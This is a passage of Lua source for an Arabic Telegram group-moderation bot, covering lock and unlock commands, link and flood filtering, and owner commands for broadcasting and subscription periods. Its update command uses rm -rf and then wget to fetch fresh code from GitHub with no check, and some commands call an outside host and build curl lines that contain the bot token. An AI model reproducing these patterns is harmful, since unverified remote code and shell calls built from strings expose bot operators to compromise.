database:del("lock_botAndBan:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الجهات") then
local fmX_o = database:get("lock_contact:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الجهات ✓")
else
fmX000("lock",msg,"※┇تم فتح الجهات ✓")
database:del("lock_contact:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح العربيه") then
local fmX_o = database:get("lock_ar:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح العربيه ✓")
else
fmX000("lock",msg,"※┇تم فتح العربيه ✓")
database:del("lock_ar:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الانكليزيه") then
local fmX_o = database:get("lock_en:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الانكليزيه ✓")
else
fmX000("lock",msg,"※┇تم فتح الانكليزيه ✓")
database:del("lock_en:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الميديا") then
local fmX_o = database:get("lock_media:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الميديا ✓")
else
fmX000("lock",msg,"※┇تم فتح الميديا ✓")
database:del("lock_media:fayomy"..msg.chat_id_..bot_id,"ok")
database:del("lock_audeo:fayomy"..msg.chat_id_..bot_id,"ok")
database:del("lock_video:fayomy"..msg.chat_id_..bot_id,"ok")
database:del("lock_photo:fayomy"..msg.chat_id_..bot_id,"ok")
database:del("lock_stecker:fayomy"..msg.chat_id_..bot_id,"ok")
database:del("lock_voice:fayomy"..msg.chat_id_..bot_id,"ok")
database:del("lock_gif:fayomy"..msg.chat_id_..bot_id,"ok")
database:del("lock_note:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح المعرف") then
local fmX_o = database:get("lock_username:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح المعرف ✓")
else
fmX000("lock",msg,"※┇تم فتح المعرف ✓")
database:del("lock_username:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح بصمه الفيديو") then
local fmX_o = database:get("lock_note:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح بصمه فيديو ✓")
else
fmX000("lock",msg,"※┇تم فتح بصمه فيديو ✓")
database:del("lock_note:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الروابط") then
local fmX_o = database:get("lock_link:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الروابط ✓")
else
fmX000("lock",msg,"※┇تم فتح الروابط ✓")
database:del("lock_link:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الدخول") then
local fmX_o = database:get("lock_join:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الدخول للمجموعه ✓")
else
fmX000("lock",msg,"🔆※ تم فتح الدخول للمجموعه ✓")
database:del("lock_join:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح البوتات") then
local fmX_o = database:get("lock_bot:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح البوتات ✓")
else
fmX000("lock",msg,"※┇تم فتح البوتات ✓")
database:del("lock_bot:fayomy"..msg.chat_id_..bot_id,"ok")
end
end  --         »»               End fayomy unlock                       ««              --
end 
end 
--         »»               Start Function Check Msg                       ««              --
function FMCheckMsg(msg) 
local text = msg.content_.text_
if text then 
if database:get("lock_word:fayomy"..msg.chat_id_..bot_id) then 
local fayomy_wr = (database:get("fayomy:not:word:"..bot_id..msg.chat_id_) or 100)
if #text >= tonumber(fayomy_wr) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
end
if text and (text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]")) then
if database:get("lock_link:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.caption_ then
text = msg.content_.caption_
if text and (text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]")) then
if database:get("lock_link:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
end
if msg.content_.caption_ then
text = msg.content_.caption_
if text and text:match("(.*)(@)(.*)")  then
if database:get("lock_username:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
end
if text and text:match("(.*)(@)(.*)")  then
if database:get("lock_username:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if database:get("lock_chat:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
if text and text:match("(.*)(/)(.*)")  then
if database:get("lock_sarha:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if text and text:match("(.*)(#)(.*)")  then
if database:get("lock_tag:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if  msg.content_.ID == "MessageChatJoinByLink" then
if database:get("lock_join:fayomy"..msg.chat_id_..bot_id) then
changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageChatAddMembers"  then
if database:get("lock_join:fayomy"..msg.chat_id_..bot_id) then
changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
return "stop"
end
end
if msg.content_.ID == "MessageChatAddMembers" then
if msg.content_.members_[0].type_.ID == 'UserTypeBot' then
if database:get("lock_bot:fayomy"..msg.chat_id_..bot_id) then
changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
end
if database:get("lock_botAndBan:fayomy"..msg.chat_id_..bot_id) then
local function cb(extra,result,success)
local bofm = result.members_
for i=0 , #bofm do
if tonumber(bofm[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,bofm[i].user_id_)
end
changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")
end
end
bot.channel_get_bofm(msg.chat_id_,cb)
end
end
end
if text and text:match("(.*)(#)(.*)")  then
if database:get("lock_sarha:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.forward_info_ then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
if database:get("lock_fwd:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
end
if msg.content_.ID == "MessageSticker" then
if database:get("lock_stecker:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then
if database:get("lock_new:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageChatAddMembers" then
database:incr('fayomy:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessageUnsupported" then
if database:get("lock_note:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessagePhoto" then
if database:get("lock_photo:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageAudio" then
if database:get("lock_audeo:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageVoice" then
if database:get("lock_voice:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageVideo" then
if database:get("lock_video:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageAnimation" then
if database:get("lock_gif:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageContact" then
if database:get("lock_contact:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if text and text:match("[\216-\219][\128-\191]") then
if database:get("lock_ar:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageDocument" then
if database:get("lock_files:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if text and text:match("[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]") then
if database:get("lock_en:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end

if msg.content_.entities_ then
if msg.content_.entities_[0] then
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then
if database:get("lock_mark:fayomy"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
end
end

if database:get("lock_lllll:fayomy"..msg.chat_id_..bot_id) then
local hash = 'flood:max:'..bot_id..msg.chat_id_
if not database:get(hash) then
floodMax = 10
else
floodMax = tonumber(database:get(hash))
end
local hash = 'fayomy:'..bot_id..'flood:time:'..msg.chat_id_
if not database:get(hash) then
floodTime = 1
else
floodTime = tonumber(database:get(hash))
end
if not is_vip(msg) then
if bot_id then
if not is_vip(msg) then
local hash = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msg-num'
local msgs = tonumber(database:get(hash) or 0)
if msgs > (floodMax - 1) then
local user = msg.sender_user_id_
local chat = msg.chat_id_
local channel = msg.chat_id_
local user_id = msg.sender_user_id_
local banned = is_banned(user_id, msg.chat_id_)
if banned then
else
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
user_id = msg.sender_user_id_
o = database:get("fmahke:spam:lock:"..os.date("%x")..bot_id..msg.chat_id_)
if (o and (tonumber(o) >= 5)) then
database:set("lock_media:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_audeo:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_video:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_photo:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_stecker:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_voice:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_gif:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_note:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_word:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_mark:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_link:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_new:fayomy"..msg.chat_id_..bot_id,"ok")
database:set('fayomy:'..bot_id..'get:photo'..msg.chat_id_,true)
send(msg.chat_id_, 0, 1, '⚠️┇تم كشف عمليه تخريب في المجموعة \n‼️┇وتم قفل الميديا وسيتم طرد جميع الاشخاص الذين يقومون بعمل تكرار', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '🎫┇الايدي ~⪼*('..msg.sender_user_id_..')* \n❕┇قمت بعمل تكرار للرسائل المحدده\n☑┇وتم كتمك في المجموعه\n', 1, 'md')
end 
if (o and (tonumber(o) > 5)) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
database:incr("fmahke:spam:lock:"..os.date("%x")..bot_id..msg.chat_id_)
database:sadd('fayomy:'..bot_id..'muted:'..msg.chat_id_, msg.sender_user_id_)
end
end
database:setex(hash, floodTime, msgs+1)
end
end
end
end
if is_banned(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
if is_muted(msg.sender_user_id_, msg.chat_id_) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end -- end fun
--         »»               Start Function Sudo                       ««              --
function FMsudo(msg)
text = msg.content_.text_
if msg.content_.text_ then
if text:match("^مغادره$") then
if not database:get('fayomy:'..bot_id..'leave:groups') then
chat_leave(msg.chat_id_, bot_id)
send(msg.chat_id_, msg.id_, 1, "☑┇تم مغادره المجموعه", 1, 'md')
else
end
end

if text:match("^رفع منشئ اساسي$") and msg.reply_to_message_id_ then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function promote_by_reply(extra, result, success)
database:del('fayomy:'..bot_id..'creatorbasic:'..msg.chat_id_)
database:sadd('fayomy:'..bot_id..'creatorbasic:'..msg.chat_id_, result.sender_user_id_)
fmX000("prore",msg,'※ تم رفعة منشئ اساسي  في البوت ✓ 👨🏻‍✈️')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^رفع منشئ اساسي @(.*)$") then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع منشئ اساسي) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
database:del('fayomy:'..bot_id..'creatorbasic:'..msg.chat_id_)
database:sadd('fayomy:'..bot_id..'creatorbasic:'..msg.chat_id_, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n※ تم رفعة منشئ اساسي  في البوت ✓ 👨🏻‍✈️'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
if text:match("^رفع منشئ اساسي (%d+)$") then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع منشئ اساسي) (%d+)$")}
database:del('fayomy:'..bot_id..'creatorbasic:'..msg.chat_id_)
database:sadd('fayomy:'..bot_id..'creatorbasic:'..msg.chat_id_, apmd[2])
fmX000(apmd[2],msg,"※ تم رفعة منشئ اساسي  في البوت ✓ 👨🏻‍✈️")
end
if text == 'توجيه للكل' and tonumber(msg.reply_to_message_id_) > 0  and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then  
function fwwdmsg(taha,storm,sorc)  
local list = database:smembers('fayomy:'..bot_id..'groups') 
for k,v in pairs(list) do  
tdcli_function ({
ID = "ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = storm.id_},
disable_notification_ = 1,
from_background_ = 1},cb or dl_cb,cmd) 
end
local gps = database:scard('fayomy:'..bot_id.."groups")  
local text = '🚸 ❯❯ تم ارسال توجيه الى *{ '..gps..' }* مجموعات'  
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')  
end  
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),fwwdmsg)  
end
if text and text == "اذاعه" then 
if (not database:get('fayomy:'..bot_id..'bc:groups') or tonumber(sudo_add) == tonumber(msg.sender_user_id_)) then
send(msg.chat_id_, msg.id_, 1, '☑┇ ارسال الان نص او الميديا : (صوره - فديو - متحركه - ملف)', 1, 'md')
database:set("fayomy:set_if_bc_new:"..bot_id..msg.sender_user_id_,"ok")
return "fayomy"
else
send(msg.chat_id_, msg.id_, 1, '☑┇ الاذاعه معطله ', 1, 'md')
end
end
if text == "تنظيف الكروبات الوهميه" and tonumber(msg.sender_user_id_) == tonumber(sudo_add)  then
local group = database:smembers("fyaomy:gog"..bot_id)
local t = 0
local s = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem("fyaomy:gog"..bot_id,group[i]) 
changeChatMemberStatus(group[i], bot_id, "Left")
t = t + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem("fyaomy:gog"..bot_id,group[i]) 
s = s + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem("fyaomy:gog"..bot_id,group[i]) 
s = s + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem("fyaomy:gog"..bot_id,group[i]) 
t = t + 1
end
if #group == i then 
if (t + s) == 0 then
send(msg.chat_id_, msg.id_, 1,'*🔎※ليس هنالك اي مجموعات وهميه في البوت* ', 1, 'md')   
else
local kara = (t + s)
local sendok = #group - kara
if s == 0 then
kara = ''
else
kara = '\n*🗑 ※ تم ازالة ← ❪ '..s..' ❫ مجموعات من البوت*'
end
if t == 0 then
fayomy = ''
else
fayomy = '\n*🗑 ※ تم ازالة ← ❪'..t..'❫ مجموعه لان البوت عضو*'
end
send(msg.chat_id_, msg.id_, 1,'*📈※ عدد المجموعات الان ← ❪ '..#group..' ❫*'..fayomy..''..kara..'\n*🗳※ الان عدد المجموعات الحقيقي ← ❪ '..sendok..' ❫ مجموعات*', 1, 'md')   
end
end
end,nil)
end
return false
end
if (text:match("^عدد الكروبات$") or text:match("^الاحصائيات$")) and is_vip(msg) then
local gps = database:scard('fayomy:'..bot_id.."groups") or 0
local user = database:scard('fayomy:'..bot_id.."userss") or 0
local gps2 = database:scard("fyaomy:gog"..bot_id) or 0
local gps9 = database:scard("fyaomy:good"..bot_id..os.date("%d")) or 0
local gps3 = database:scard('fayomy:'..bot_id..'pro:groups') or 0
send(msg.chat_id_, msg.id_, 1, '• المجموعات :\n📊┇عدد الكروبات الكلي ~⪼  *{'..gps..'}*\n🔋┇عدد الكروبات المفعله ~⪼  *{'..gps2..'}*\n🔌┇عدد الكروبات الغير مفعله ~⪼  *{'..(gps - gps2)..'}*\n💡┇عدد الكروبات المدفوعه ~⪼  *{'..(gps3)..'}*\n⏱┇عدد الكروبات المتفاعله اليوم ~⪼  *{'..(gps9)..'}*\n\n• الاعضاء :\n👥┇ عدد اعضاء الخاص : {`'..user..'`}', 1, 'md')
end
if tonumber(sudo_add) == tonumber(msg.sender_user_id_) then
if text:match("^تفعيل الكل$") then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local gps = database:smembers('fayomy:'..bot_id.."groups") or 0
local gps2 = database:smembers("fyaomy:gog"..bot_id) or 0
for i=1,#gps do
database:sadd("fyaomy:gog"..bot_id, gps[i])
database:set('fayomy:'..bot_id.."enable:"..gps[i],true)
database:set( 'fayomy:'..bot_id.."charge:"..gps[i],true)
end
send(msg.chat_id_, msg.id_, 1, '🔋┇تم تفعيل ~⪼  *{'..(#gps - #gps2)..'}*', 1, 'md')
end
if text:match("^تعطيل الكل$") then
local gps = database:smembers('fayomy:'..bot_id.."groups") or 0
local gps2 = database:smembers("fyaomy:gog"..bot_id) or 0
for i=1,#gps do
database:del("fyaomy:gog"..bot_id)
database:del('fayomy:'..bot_id.."enable:"..gps[i])
database:del( 'fayomy:'..bot_id.."charge:"..gps[i])
end
send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل ~⪼  *{'..#gps..'}*', 1, 'md')
end
if text:match("^مغادره الكل$") then
local gps = database:smembers('fayomy:'..bot_id.."groups") or 0
local gps2 = database:smembers("fyaomy:gog"..bot_id) or 0
send(msg.chat_id_, msg.id_, 1, '💣┇تم مغادره ~⪼  *{'..#gps..'}*', 1, 'md')
for i=1,#gps do
database:del('fayomy:'..bot_id.."enable:"..gps[i])
chat_leave(msg.chat_id_, bot_id)
end
database:del("fyaomy:gog"..bot_id)
database:del('fayomy:'..bot_id.."groups")
end
end 
if text:match("^روابط الكروبات$") then
local gpss = database:smembers('fayomy:'..bot_id.."groups") or 0
text233 = '📊┇روابط الكروبات\n\n'
for i=1, #gpss do
local link = database:get('fayomy:'..bot_id.."group:link"..gpss[i])
text233 = text233.."|"..i.."| ~⪼ "..gpss[i].."\n ~⪼ "..(link or  "لا يوجد رابط").."\n"
end
local f = io.open('FayOmY.txt', 'w')
f:write(text233)
f:close()
local fayomye = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
local curl = 'curl "' .. fayomye .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'FayOmY.txt' .. '"'
io.popen(curl)
end
if text and (text == "الكروبات المتفاعله" or text == "روابط الكروبات المتفاعله") then
local gpss = database:smembers("fyaomy:good"..bot_id..os.date("%d")) or 0
text233 = '📊┇روابط الكروبات المتفاعله\n\n'
for i=1, #gpss do
local link = database:get('fayomy:'..bot_id.."group:link"..gpss[i])
text233 = text233.."|"..i.."| ~⪼ "..gpss[i].."\n ~⪼ "..(link or  "لا يوجد رابط").."\n"
end
local f = io.open('FayOmY.txt', 'w')
f:write(text233)
f:close()
local fayomye = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
local curl = 'curl "' .. fayomye .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'FayOmY.txt' .. '"'
io.popen(curl)
end
if text:match("^تحديث السورس$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '☑┇تم التحديث', 1, 'md')
os.execute('rm -rf ./libs/utils.lua')
os.execute('cd libs && wget https://raw.githubusercontent.com/FAYOMYGAMER/FAYOMY/master/libs/utils.lua')
os.execute('rm -rf Fayomy.lua')
os.execute('wget https://raw.githubusercontent.com/FAYOMYGAMER/FAYOMY/master/Fayomy.lua')
os.exit()
return false
end
if text:match("^وضع وقت (%d+)$") then
local a = {string.match(text, "^(وضع وقت) (%d+)$")}
local time = a[2] * day
database:setex( 'fayomy:'..bot_id.."charge:"..msg.chat_id_,time,true)
database:set( 'fayomy:'..bot_id.."enable:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_, 1, '🔘┇تم وضع وقت انتهاء البوت *{'..a[2]..'}* يوم', 1, 'md')
end--
if text:match("^وقت المجموعه (-%d+)$") then
local txt = {string.match(text, "^(وقت المجموعه) (-%d+)$")}
local ex = database:ttl( 'fayomy:'..bot_id.."charge:"..txt[2])
if ex == -1 then
send(msg.chat_id_, msg.id_, 1, '🔘┇وقت المجموعه لا نهائي', 1, 'md')
else
local d = math.floor(ex / day ) + 1
send(msg.chat_id_, msg.id_, 1, "❕┇عدد ايام وقت المجموعه {"..d.."} يوم", 1, 'md')
end
end
if text:match("^مغادره (-%d+)$")  then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local txt = {string.match(text, "^(مغادره) (-%d+)$")}
send(msg.chat_id_, msg.id_, 1, '🔘┇المجموعه {'..txt[2]..'} تم الخروج منها', 1, 'md')
database:del("fyaomy:gog"..bot_id,txt[2])
chat_leave(txt[2], bot_id)
end
if text:match('^المده1 (-%d+)$')  then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local txt = {string.match(text, "^(المده1) (-%d+)$")}
local king_info = nil
function king333(extra,result,success)
king_info = '@'..(result.username_ or 'لا يوجد')..''
local timeplan1 = 2592000
database:setex( 'fayomy:'..bot_id.."charge:"..txt[2],timeplan1,true)
send(msg.chat_id_, msg.id_, 1, '☑┇المجموعه ('..txt[2]..') تم اعادة تفعيلها المدة 30 يوم', 1, 'md')
send(txt[2], 0, 1, '☑┇تم تفعيل مدة المجموعه 30 يوم', 1, 'md')
for k,v in pairs(sudo_users) do
function fyaomy_info(k1,k2)
send(v, 0, 1, "🔘┇قام بتفعيل مجموعه المده كانت 30 يوم \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ "..king_info.."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ┇اسم المجموعه ~⪼ ("..k2.title_..")" , 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
end
database:set( 'fayomy:'..bot_id.."enable:"..txt[2],true)
end
getUser(msg.sender_user_id_, king333)
end
if text:match('^المده2 (-%d+)$')  then
local txt = {string.match(text, "^(المده2) (-%d+)$")}
local king_info = nil
function king333(extra,result,success)
king_info = '@'..(result.username_ or 'لا يوجد')..''
local timeplan2 = 7776000
database:setex( 'fayomy:'..bot_id.."charge:"..txt[2],timeplan2,true)
send(msg.chat_id_, msg.id_, 1, '☑┇المجموعه ('..txt[2]..') تم اعادة تفعيلها المدة 90 يوم', 1, 'md')
send(txt[2], 0, 1, '☑┇تم تفعيل مدة المجموعه 90 يوم', 1, 'md')
for k,v in pairs(sudo_users) do
function fyaomy_info(k1,k2)
send(v, 0, 1, "🔘┇قام بتفعيل مجموعه المده كانت 90 يوم \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ "..king_info.."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ┇اسم المجموعه ~⪼ ("..k2.title_..")" , 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
end
database:set( 'fayomy:'..bot_id.."enable:"..txt[2],true)
end
getUser(msg.sender_user_id_, king333)
end
if text:match('^المده3 (-%d+)$')  then
local txt = {string.match(text, "^(المده3) (-%d+)$")}
local king_info = nil
function king333(extra,result,success)
king_info = '@'..(result.username_ or 'لا يوجد')..''
database:set( 'fayomy:'..bot_id.."charge:"..txt[2],true)
send(msg.chat_id_, msg.id_, 1, '☑┇المجموعه ('..txt[2]..') تم اعادة تفعيلها المدة لا نهائية', 1, 'md')
send(txt[2], 0, 1, '☑┇تم تفعيل مدة المجموعه لا نهائية', 1, 'md')
for k,v in pairs(sudo_users) do
function fyaomy_info(k1,k2)
send(v, 0, 1, "🔘┇قام بتفعيل مجموعه المده كانت لا نهائية \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ "..king_info.."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ┇اسم المجموعه ~⪼ ("..k2.title_..")" , 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
end
database:set( 'fayomy:'..bot_id.."enable:"..txt[2],true)
end
getUser(msg.sender_user_id_, king333)
end
if tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if (msg.content_.text_ == 'الملفات' ) then
local files_fayomy = database:smembers("files"..bot_id)
local king = io.popen('cd files_fayomy && ls'):read("*all")
local files_fayomy2 = ''
for i=1,#files_fayomy do
files_fayomy2 = files_fayomy2..'{'..files_fayomy[i]..'}\n'
end
send(msg.chat_id_, msg.id_, 1, '☑┇جميع الملفات : \n '..king..'\n ---------------------- \n\n✔┇الملفات المفعله \n'..files_fayomy2..'', 1, 'html')
end
text = msg.content_.text_
if text then
